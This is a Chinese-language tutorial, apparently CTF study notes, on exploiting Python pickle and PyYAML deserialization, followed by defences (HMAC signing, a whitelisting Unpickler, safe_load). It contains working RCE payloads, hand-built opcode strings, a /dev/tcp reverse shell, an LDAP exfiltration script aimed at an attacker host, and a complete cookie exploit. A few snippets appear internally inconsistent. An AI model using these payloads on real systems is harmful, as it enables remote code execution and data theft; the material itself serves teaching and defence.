# Python 反序列化漏洞

## 一句话理解
README 里那句话的展开版：PHP、Java 序列化的是"数据"，Python 的 pickle 序列化的是"代码逻辑"——反序列化 pickle 的过程本质是执行一台小型虚拟机的指令，因此拿到反序列化入口基本等于拿到代码执行。

## 核心原理
- pickle 把对象图编译成一串操作码（opcode），`pickle.loads()` 由 PVM（Pickle Virtual Machine）逐条执行
- 还原对象时会调用类的 `__reduce__()` / `__reduce_ex__()`，它返回 `(callable, args)`，PVM 直接以 `callable(*args)` 执行
- 因此 payload 的核心就是控制 `__reduce__` 返回 `os.system` / `subprocess` 等可调用对象

## 成立条件
- 应用使用 `pickle.loads()` / `pickle.load()` / `yaml.load()` / `jsonpickle.decode()` 处理外部可控数据
- 数据未做完整性校验（无签名/HMAC），攻击者可篡改或构造

## pickle 利用
### 1. 基础 payload

```python
import pickle, os

class Exp:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exp())
```

### 2. 常见可调用目标
- `os.system` / `os.popen`
- `subprocess.Popen` / `subprocess.check_output`
- `builtins.eval` / `builtins.exec`
- `map` / `getattr` 组合（绕过直接出现危险函数名）

### 3. 手写 opcode（CTF 高频）
过滤了某些字节或函数名时，直接手写 opcode 绕过：

```text
cos
system
(S'id'
oR
```

含义：`c` 引入模块函数，`S` 压入字符串，`o` 构建对象，`R` 调用执行。配合 `pickletools.dis()` 分析、调整。

### 4. 反弹 shell

```python
class Exp:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'"
        return (os.system, (cmd,))
```

## opcode 手工构造进阶

### 1. 常用 opcode 速查表

pickle opcode 是单字符指令，PVM 基于"栈 + memo 记忆区"执行。手搓 payload 前先把这张表记熟：

| opcode | 名称 | 一句话说明 |
| --- | --- | --- |
| `(` | MARK | 在栈上压入一个标记，作为后续"组操作"的起点（栈底界碑） |
| `t` | TUPLE | 从最近的 MARK 起弹出全部元素，打包成元组压栈 |
| `l` | LIST | 从最近的 MARK 起弹出全部元素，打包成列表压栈 |
| `d` | DICT | 从最近的 MARK 起弹出元素，两两配对（k,v）打包成字典压栈 |
| `)` | TUPLE1 | 弹出 1 个元素组成一元组（py3 新增，`t` 的精简版） |
| `R` | REDUCE | 弹出元组 args 和可调用对象 f，执行 `f(*args)` 并把结果压栈——**RCE 核心** |
| `S` | STRING | 压入一个带引号的字符串字面量（换行结束） |
| `V` | UNICODE | 压入 unicode 字符串，py3 下兼容，可用于引号被过滤的场景 |
| `I` | INT | 压入十进制整数（换行结束） |
| `.` | STOP | 结束执行，栈顶即反序列化结果 |
| `c` | GLOBAL | 取全局对象：`c<模块名>\n<函数/类名>\n`，找类找函数全靠它 |
| `g` | GET | 从 memo 记忆区按编号取回对象压栈（对象复用） |
| `p` | PUT | 把栈顶对象存入 memo 指定编号 |
| `o` | OBJ | 从 MARK 起弹出参数和类，按 `cls(*args)` 构造实例 |
| `i` | INST | py2 的实例构造（等价 GLOBAL + OBJ），py3 下仍可用 |

> 注意区分：`o` 是 OBJ、`i` 是 INST，不少资料把两者混称为 INST，构造时以 `pickletools.dis` 的反汇编结果为准。

### 2. 逐指令注释示例

最简 RCE（`os.system('id')`）：

```text
cos            # c 指令：查找全局对象 os.system 压栈（模块名、成员名各占一行）
system
(              # ( 指令：压入 MARK 标记
S'id'          # S 指令：压入字符串 'id'
t              # t 指令：从 MARK 起弹出元素 → 元组 ('id',) 压栈
R              # R 指令：弹出元组和可调用对象 → 执行 os.system('id')
.              # . 指令：STOP 结束
```

列表参数（`subprocess.check_output(['ls','/'])`）：

```text
csubprocess
check_output   # c 指令：压入 subprocess.check_output
(              # MARK：参数起点
S'ls'          # 压入 'ls'
S'/'           # 压入 '/'
l              # l 指令：从 MARK 起打包 → ['ls', '/'] 压栈
R.             # REDUCE：check_output(['ls','/']) 执行，随后 STOP
```

memo 复用（p/g，片段示例，完整 payload 需以 `.` 结束）：

```text
(I1            # MARK + 压入整数 1
p1             # p 指令：栈顶（整数 1）存入 memo[1]
g1             # g 指令：取回 memo[1] → 栈上出现指向同一对象的第二个引用
```

> 对象图中"同一对象多处引用"就靠 p/g 实现，生成的 payload 才能被 `pickletools.dis` 干净地回读。

### 3. py3 绕过片段

当题目过滤 `c` 指令（`c` + 换行的字节特征）时，protocol 4 的 `\x8c`（SHORT_BINUNICODE）+ `\x93`（STACK_GLOBAL）组合可替代：

```text
\x8c\x08builtins\x8c\x04exec\x8c\x1d__import__('os').system('id')\x85R.
# 两个 \x8c 分别压入模块名/成员名，\x93 把栈上两个字符串拼成全局对象，等价于 c 指令但没有 c 和换行
```

## pker 工具

手写 opcode 适合小 payload；链一长（嵌套调用、属性赋值、对象复用）就该上 **pker**——用 Python 风格语法描述 payload，工具自动编译成 opcode：

- GitHub：<https://github.com/EddieIvan01/pker>
- 依赖：`pip install ply`

用法：把 payload 语法写进 `.pker` 文件，运行 `python3 pker.py exp.pker` 得到 opcode 串（以仓库 README 为准）。

常用语法速览：

| pker 写法 | 作用 | 对应 opcode 要点 |
| --- | --- | --- |
| `a = GLOBAL('os', 'system')` | 取全局函数/类 | `c` 指令 |
| `a(args...)` | 调用可调用对象 | `(` + `t` + `R` |
| `a.attr` / `a.attr = b` | 属性读/写 | 配合 OBJ 与 BUILD 实现 |
| `[...]` / `(...)` / `{...}` | 容器字面量 | `l` / `t` / `d` |
| `INST` / `OBJ` | 实例化 | `i` / `o` |
| `RETURN` | 显式结束并返回 | 末尾结束指令 |

示例 1：命令执行：

```python
# exp.pker —— 等价 os.system('whoami')
system = GLOBAL('os', 'system')
system('whoami')
```

生成的 opcode（核心片段如下，字符串指令是 `S` 还是 `V` 以实际输出为准）：

```text
cos
system
(S'whoami'
tR.
```

示例 2：Ldap3 外带（无回显/禁 os 场景的经典思路，把执行结果经攻击者 LDAP 服务带出）：

```python
# ldap.pker —— ldap3 连接 VPS 并 search，把环境信息作为查询发回
server = GLOBAL('ldap3', 'Server')
conn   = GLOBAL('ldap3', 'Connection')

s = server('ldap://your-vps:1389', port=1389, get_info='ALL')
c = conn(s, user='cn=admin,dc=ctf,dc=com', password='admin')
c.search('dc=ctf,dc=com', '(objectClass=*)', attributes='*')
```

思路：VPS 起 LDAP 服务收请求，search 的过滤串/属性里携带命令执行结果，实现无回显数据外带。生成后务必本地 `pickle.loads` 自测，再用 `pickletools.dis` 核对指令流。

pker 备注：
- 变量绑定天然对应 memo（p/g），对象复用不需要手动编号
- 目标环境缺 ldap3 就换思路：redis、FTP、requests 等任何"能发网络请求"的库都可以当外带通道

## pickle 完整例题

题目源码（典型"自动登录"场景）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
import pickle

class Session:
    """用户会话对象：服务端 pickle 后 base64 存入 cookie"""
    def __init__(self, user):
        self.user = user

def main():
    cookie = input("session: ").strip()
    data = base64.b64decode(cookie)      # 只做解码
    obj = pickle.loads(data)             # 危险入口：无签名校验、无限流
    print("welcome, " + getattr(obj, 'user', 'guest'))

if __name__ == '__main__':
    main()
```

分析：
1. cookie 完全可控，`pickle.loads` 前只有 base64 解码，**没有任何完整性校验**
2. 未重写 `find_class`（无限流），任意全局对象可调用
3. → 直接控制 `__reduce__` 返回 `(os.system, (...))`，一行打通

构造过程：
- pickle 还原对象时调用 `__reduce__`，把返回的 `(callable, args)` 以 `callable(*args)` 执行
- 回显选 `os.system`（输出直接打到标准输出）；不出网环境带 flag 用 curl/wget 外带

exp（本地生成 payload）：

```python
# exp.py —— 本地运行生成 payload
import pickle, base64, os

class P:
    def __reduce__(self):
        # 验证链路时先执行 id；拿 flag 时换成 cat /flag
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(P())).decode())
```

手工 opcode 形态（`os.system('cat /flag')`，文本协议 0 指令，跨版本稳定）：

```text
cos
system
(S'cat /flag'
tR.
```

最终 payload（上述 opcode 的 base64，直接塞进 cookie 提交）：

```text
Y29zCnN5c3RlbQooUydjYXQgL2ZsYWcnCnRSLg==
```

生成方式对照：

```python
# 方式一：标准 dumps 生成（见上文 exp.py，不同 Python 版本字节流可能略有差异）
# 方式二：手工 opcode 直接 base64（文本 opcode 跨版本最稳，可绕部分字节过滤）
import base64
opcode = b"cos\nsystem\n(S'cat /flag'\ntR."
print(base64.b64encode(opcode).decode())
# 输出：Y29zCnN5c3RlbQooUydjYXQgL2ZsYWcnCnRSLg==
```

> 提示：`pickle.dumps` 生成的二进制流（带 PROTO/FRAME/SHORT_BINUNICODE 等指令）与手工文本 opcode 都能被 `loads` 执行；被过滤盯上时两种形态互为备份。

`pickletools.dis(b"cos\nsystem\n(S'id'\ntR.")` 的反汇编视角：

```text
    0: c    GLOBAL     'os system'
   11: (    MARK
   12: S    STRING     'id'
   18: t    TUPLE      (MARK at 11)
   19: R    REDUCE
   20: .    STOP
```

执行流程串讲：

```text
input → base64.b64decode → pickle.loads
  └─ PVM 逐条执行 opcode
      └─ c 指令拿到 os.system
          └─ R 指令 REDUCE → os.system('cat /flag') → 命令输出打到 stdout（回显）
```

## 沙箱与绕过
常见限制：重写 `find_class()` 做模块白名单、过滤 `os`/`subprocess` 等关键词。绕过思路：
- 白名单内找跳板：`builtins.getattr` -> `builtins.eval`；`pydoc` 等模块间接拿到 `os`
- 利用 `getattr` 拼接字符串构造模块名，绕过关键词匹配
- opcode 层面拆段、编码，绕过基于字节序列的过滤

## PyYAML
- `yaml.load(data)`（旧版默认 Loader）可构造任意 Python 对象：

```yaml
!!python/object/apply:os.system ["id"]
```

- `yaml.load(data, Loader=yaml.Loader)` / `FullLoader` 历史版本均存在绕过链
- 安全写法：`yaml.safe_load(data)`，只解析基础数据类型

## 其他序列化入口
| 库 | 风险点 |
| --- | --- |
| jsonpickle | 支持 `{"py/reduce": ...}` 还原任意调用 |
| shelve / marshal | 底层基于 pickle / 代码对象，同样危险 |
| dill | pickle 超集，可序列化 lambda，更灵活也更危险 |

## 与 PHP / Java 反序列化对比
| 维度 | PHP / Java | Python pickle |
| --- | --- |
| 序列化内容 | 对象属性（数据） | 对象 + 可执行指令 |
| 利用核心 | 拼 POP 链 / 找 gadget | 控制 `__reduce__` 返回值 |
| 利用难度 | 依赖目标类路径上的 gadget | 通常直接 RCE，不依赖业务类 |

## 防御要点
- 不用 pickle / yaml.load 处理任何不可信数据，跨端传输用 JSON
- 必须使用时，先校验 HMAC 签名再反序列化
- `yaml` 一律 `safe_load`
- 网络边界限制出网（防反弹），运行环境最小权限

## 反序列化防御正确姿势

上面的「防御要点」是原则清单，这里给出可落地的正确姿势，按优先级从高到低：

### 1. 根本姿势：禁止 loads 不可信输入
- 任何来自网络/文件/数据库/消息队列的 pickle 数据一律视为恶意
- 跨服务、跨语言传输统一用 JSON：只搬数据、不搬行为，天然没有 RCE 面

### 2. 必须用 pickle 时：HMAC 签名验证

签名只能防篡改（前提是密钥不泄露），验签通过才允许 `loads`：

```python
import base64, hashlib, hmac, pickle

SECRET = b'change-me-32-bytes-random-secret'   # 服务端密钥，绝不入库/入日志

def dumps_signed(obj):
    """签名 + 封装：mac（前 32 字节）+ pickle 数据"""
    data = pickle.dumps(obj)
    mac = hmac.new(SECRET, data, hashlib.sha256).digest()
    return base64.b64encode(mac + data)

def loads_signed(token):
    """先验签，再反序列化；任何一步失败直接拒绝"""
    raw = base64.b64decode(token, validate=True)
    mac, data = raw[:32], raw[32:]
    expect = hmac.new(SECRET, data, hashlib.sha256).digest()
    # compare_digest 常数时间比较，防时序侧信道；不要用 == 直接比对
    if not hmac.compare_digest(mac, expect):
        raise ValueError('bad signature')
    return pickle.loads(data)   # 只有确认数据可信后才允许走到这一步
```

要点：
- `hmac.compare_digest` 防时序攻击，禁止 `==` 直接比签名
- 签名密钥泄露 = 防线归零：密钥要独立存储、支持轮换
- HMAC 防的是"外部篡改"，不防"生成侧被攻破"——生成 payload 的内部服务同样要管好

### 3. 官方补充姿势：受限 Unpickler 白名单

```python
import io, pickle

class RestrictedUnpickler(pickle.Unpickler):
    """只允许反序列化白名单模块内的类，其余一律拒绝"""
    ALLOWED = {'collections', 'datetime', 'decimal'}

    def find_class(self, module, name):
        if module.split('.')[0] in self.ALLOWED:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f'forbidden: {module}.{name}')

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

> 三层顺序：能换 JSON 就换（根本）→ 必须 pickle 就 HMAC 验签（防篡改）→ 再叠加受限 Unpickler（限流兜底）。任何单一手段都不够，组合使用才叫"正确姿势"。

## 参考
- [Python pickle 官方文档 - 安全警告](https://docs.python.org/3/library/pickle.html)
- [PyYAML 文档](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [pker - pickle opcode 生成器](https://github.com/EddieIvan01/pker)
- [pickletools 官方文档 - pickle 反汇编工具](https://docs.python.org/3/library/pickletools.html)
